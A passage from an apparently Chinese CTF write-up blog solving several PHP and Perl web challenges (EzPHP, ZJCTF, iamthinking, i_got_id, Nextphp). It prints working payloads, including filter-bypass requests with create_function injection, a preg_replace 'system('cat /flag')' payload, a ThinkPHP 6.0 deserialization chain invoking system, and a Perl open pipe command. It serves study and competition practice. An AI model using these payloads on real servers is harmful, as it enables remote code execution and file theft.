class="hljs-string">"&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x5b;&#x2b;&#x5d;&#x20;&#x57;&#x65;&#x6c;&#x63;&#x6f;&#x6d;&#x65;&#x20;&#x74;&#x6f;&#x20;&#x6d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x20;&#x73;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;"</span>;</span><br><span class="line">            $file_shtml = <span class="hljs-string">"public/"</span>.get_hash().<span class="hljs-string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">            ***</span></span><br><span class="line"><span class="hljs-string">            ***</span></span><br><span class="line"><span class="hljs-string">            Hello,'</span>.$_POST[<span class="hljs-string">'username'</span>].<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">            ***</span></span><br><span class="line"><span class="hljs-string">			***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="hljs-keyword">echo</span> <span class="hljs-string">"[!] Header  error ..."</span>;</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x5b;&#x21;&#x5d;&#x20;&#x46;&#x61;&#x69;&#x6c;&#x65;&#x64;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;"</span>;</span><br><span class="line">            </span><br><span class="line">    }<span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">	***</span><br><span class="line">    }</span><br><span class="line">	***</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>跑(抄)出来的md5是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020666</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>后面利用的是apache的ssi漏洞注入</p>
<p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">SSI注入漏洞总结</a></p>
<p>flag在上一层</p>
<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="hljs-number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="hljs-string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="hljs-string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="hljs-string">'passwd'</span>];</span><br><span class="line">$arg = <span class="hljs-string">''</span>;</span><br><span class="line">$code = <span class="hljs-string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>"</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER) { </span><br><span class="line">    <span class="hljs-keyword">if</span> (</span><br><span class="line">  preg_match(<span class="hljs-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="hljs-string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'You seem to want to do something bad?'</span>); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/http|https/i'</span>, $_GET[<span class="hljs-string">'file'</span>])) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/^aqua_is_cute$/'</span>, $_GET[<span class="hljs-string">'debu'</span>]) && $_GET[<span class="hljs-string">'debu'</span>] !== <span class="hljs-string">'aqua_is_cute'</span>) { </span><br><span class="line">        $file = $_GET[<span class="hljs-string">"file"</span>]; </span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Neeeeee! Good Job!<br>"</span>;</span><br><span class="line">    } </span><br><span class="line">} <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>($_REQUEST) { </span><br><span class="line">    <span class="hljs-keyword">foreach</span>($_REQUEST <span class="hljs-keyword">as</span> $value) { </span><br><span class="line">        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">'fxck you! I hate English!'</span>); </span><br><span class="line">    } </span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (file_get_contents($file) !== <span class="hljs-string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ( sha1($shana) === sha1($passwd) && $shana != $passwd ){</span><br><span class="line">    extract($_GET[<span class="hljs-string">"flag"</span>]);</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Very good! you know my password. But what is flag?<br>"</span>;</span><br><span class="line">} <span class="hljs-keyword">else</span>{</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="hljs-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) { </span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">} <span class="hljs-keyword">else</span> { </span><br><span class="line">    <span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="hljs-string">''</span>, $arg); </span><br><span class="line">} <span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<ol>
<li><p>绕过</p>
<p> </p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="hljs-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="hljs-string">'QUERY_STRING'</span>])</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> url编码即可</p>
</li>
<li><p>绕过</p>
<p> </p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/^aqua_is_cute$/'</span>, $_GET[<span class="hljs-string">'debu'</span>]) && $_GET[<span class="hljs-string">'debu'</span>] !== <span class="hljs-string">'aqua_is_cute'</span>) { </span><br><span class="line">        $file = $_GET[<span class="hljs-string">"file"</span>]; </span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Neeeeee! Good Job!<br>"</span>;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> 因为正则没有<code>/g</code>, 添加一个<code>%0a</code>就可以绕过了</p>
</li>
<li><p>绕过</p>
<p> </p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>($_REQUEST) { </span><br><span class="line">    <span class="hljs-keyword">foreach</span>($_REQUEST <span class="hljs-keyword">as</span> $value) { </span><br><span class="line">        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">'fxck you! I hate English!'</span>); </span><br><span class="line">    } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> 这里的话是利用POST参数来覆盖GET参数, 我们知道POST和GET的参数是分别放在不同的数组的, 但是在<code>$_REQUEST</code>中, 是合并在一起的, 并且优先级如下</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET<POST</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>绕过</p>
<p> </p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (file_get_contents($file) !== <span class="hljs-string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> data协议, 老考点了</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;data</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218140643.png" alt></p>
</li>
<li><p>绕过</p>
<p> </p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( sha1($shana) === sha1($passwd) && $shana != $passwd )</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> 记得好像见过sha1碰撞的, 暂时找不到了, 这里直接用数组就可以了</p>
<p> 到这一步的payload是</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /1nD3x.php?file=data:text/plain;base64,%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&%73%68%61%6e%61[]=&%70%61%73%73%77%64[]=1&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a </span><br><span class="line"></span><br><span class="line">file=1&shana=1&password=1&debu=1</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218143344.png" alt></p>
</li>
<li><p>绕过</p>
<p> </p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET[<span class="hljs-string">"flag"</span>]);</span><br><span class="line"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="hljs-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) { </span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">} <span class="hljs-keyword">else</span> { </span><br><span class="line">    <span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="hljs-string">''</span>, $arg); </span><br><span class="line">} <span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p> 利用前面给的<code>extract</code>赋值变量, 然后利用<code>create_function</code>绕过即可</p>
<p> 这里有很多解决方法, 具体可以看 <a href="https://www.gem-love.com/websecurity/770.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/770.html</a></p>
<p> 调的很暴躁</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67%5b%63%6f%64%65%5d=create_function&%66%6c%61%67%5b%61%72%67%5d=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//</span><br><span class="line"></span><br><span class="line">file=1&shana=1&password=1&debu=1&flag=1</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
</ol>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>这名字听起来怪怪的</p>
<p>首先是data协议和伪协议读源码, 第二步是<code>preg_replace</code>的命令执行, 主要是怎么让正则匹配到</p>
<p>payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*={${getFlag()}}&cmd=system('cat /flag')</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>\S</code>表示匹配非空白字符, 简单测一下就可以知道php会替换某些字符</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218161049.png" alt></p>
<p>比如这里的<code>.</code>就被替换了, 就由于有特殊字符就不能用<code>\w</code>, 所以用了<code>\S</code></p>
<h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><p>测一下版本, 是<code>tp6.0</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218161339.png" alt></p>
<p>掏出payload就是打</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span> {</span><br><span class="line"></span><br><span class="line">    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;</span><br><span class="line">    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;</span><br><span class="line">    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">RelationShip</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span></span><br><span class="line"><span class="hljs-class">    </span>{</span><br><span class="line">        <span class="hljs-keyword">use</span> <span class="hljs-title">Conversion</span>;</span><br><span class="line">        <span class="hljs-keyword">use</span> <span class="hljs-title">RelationShip</span>;</span><br><span class="line">        <span class="hljs-keyword">use</span> <span class="hljs-title">Attribute</span>;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">private</span> $lazySave;</span><br><span class="line">        <span class="hljs-keyword">protected</span> $table;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($obj)</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>->lazySave = <span class="hljs-keyword">true</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>->table = $obj;</span><br><span class="line">            <span class="hljs-keyword">$this</span>->visible = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'hu3sky'</span>=><span class="hljs-string">'aaa'</span>));</span><br><span class="line">            <span class="hljs-keyword">$this</span>->relation = <span class="hljs-keyword">array</span>(<span class="hljs-string">"hu3sky"</span>=><span class="hljs-string">'aaa'</span>);</span><br><span class="line">            <span class="hljs-keyword">$this</span>->data = <span class="hljs-keyword">array</span>(<span class="hljs-string">"a"</span>=><span class="hljs-string">'cat /flag'</span>);</span><br><span class="line">            <span class="hljs-keyword">$this</span>->withAttr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"a"</span>=><span class="hljs-string">"system"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span> {</span><br><span class="line">    <span class="hljs-title">trait</span> <span class="hljs-title">Conversion</span></span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-title">protected</span> $<span class="hljs-title">visible</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">trait</span> RelationShip</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">private</span> $relation;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">trait</span> Attribute</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">private</span> $data;</span><br><span class="line">        <span class="hljs-keyword">private</span> $withAttr;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span> {</span><br><span class="line">    <span class="hljs-title">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-title">extends</span> \<span class="hljs-title">think</span>\<span class="hljs-title">Model</span></span><br><span class="line">    {</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-title">namespace</span> {</span><br><span class="line">    $a = new think\model\Pivot('');</span><br><span class="line">    $b = <span class="hljs-keyword">new</span> think\model\Pivot($a);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>后面再具体分析一下tp各个版本的rce吧</p>
<p>另外注意一下有个地方需要绕过, 参考飘零师傅的 <a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">parse-url函数小记</a></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218162204.png" alt></p>
<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><p>看到<code>perl</code>就猜测是open的漏洞了</p>
<p><a href="https://tsublogs.wordpress.com/2016/09/18/606/" target="_blank" rel="noopener">https://tsublogs.wordpress.com/2016/09/18/606/</a></p>
<p>具体的分析可以看上面, 不过我测了一下里面的payload似乎用不了, 当然我们可以直接读文件</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flag</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218164216.png" alt></p>
<p>RCE的话通过以下的方式, 但是这里不太理解为什么<code>|</code>前要跟个空格才行</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%20/flag%20|</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218164113.png" alt></p>
<h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p>还是以这道题作为这篇的结尾吧, 挺怀念的</p>
<p>先看phpinfo</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218171721.png" alt></p>
<p>可以看到是<code>7.4</code>版本, 这就很灵性了, 当时最新的stable才到7.3</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218171806.png" alt></p>
<p>disable_function应该都过滤完了, 这里的题意是用php7.4的新特性解题</p>
<p><a href="https://stitcher.io/blog/new-in-php-74" target="_blank" rel="noopener">https://stitcher.io/blog/new-in-php-74</a></p>
<p>这里主要运用的有两个</p>
<ol>
<li>预加载</li>
</ol>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218210157.png" alt></p>
<p>而回到phpinfo, 搜索一下preload会看到</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200218210336.png" alt></p>
<p>读一下源码</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile("preload.php");</span><br></pre></td></tr></tbody></table></figure><p></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">protected</span> $data = [</span><br><span class="line">        <span class="hljs-string">'ret'</span> => <span class="hljs-keyword">null</span>,</span><br><span class="line">        <span class="hljs-string">'func'</span> => <span class="hljs-string">'print_r'</span>,</span><br><span class="line">        <span class="hljs-string">'arg'</span> => <span class="hljs-string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span> <span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>->data[<span class="hljs-string">'ret'</span>] = <span class="hljs-keyword">$this</span>->data[<span class="hljs-string">'func'</span>](<span class="hljs-keyword">$this</span>->data[<span class="hljs-string">'arg'</span>]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__serialize</span><span class="hljs-params">()</span>: <span class="hljs-title">array</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>->data;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span><span class="hljs-params">(array $data)</span> </span>{</span><br><span class="line">        array_merge(<span class="hljs-keyword">$this</span>->data, $data);</span><br><span class="line">        <span class="hljs-keyword">$this</span>->run();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> <span class="hljs-params">()</span>: <span class="hljs-title">string</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>->data);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span><span class="hljs-params">($payload)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>->data = unserialize($payload);</span><br><span class="line">        <span class="hljs-keyword">$this</span>->run();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span> <span class="hljs-params">($key)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>->data[$key];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span 